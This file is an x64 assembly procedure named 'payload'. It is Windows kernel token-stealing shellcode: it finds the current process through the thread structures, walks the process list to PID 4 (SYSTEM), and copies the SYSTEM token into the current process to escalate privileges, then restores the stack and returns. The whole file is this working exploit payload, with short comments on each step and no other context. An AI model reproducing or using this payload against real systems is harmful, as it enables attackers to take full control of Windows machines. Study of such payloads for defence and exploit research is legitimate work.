.code
payload proc
	push rax
	push rcx
	push rdx
	; _KPCR -> _KPRCB -> _KTHREAD (Current Thread)
	xor rax, rax
	mov rax, gs:[rax + 188h]
	
	; _KTHREAD -> _EPROCESS
	mov rax, [rax + 70h]

	; Save current thread _EPROCESS address
	mov rcx, rax
	mov rdx, 4

	; Iterate over processes until getting to PID 4 (system process, runs as the system user)
CheckSystem:
	mov rax, [rax + 188h]
	sub rax, 188h
	
	cmp [rax + 180h], rdx
	jne CheckSystem

	; Copy system token from PID 4 to current our process to elevate permissions
	mov rax, [rax + 208h]
	mov [rcx + 208h], rax

	; Cleanup stack and return program execution
	pop rdx
	pop rcx
	pop rax
	add rsp, 28h
	ret
payload endp
end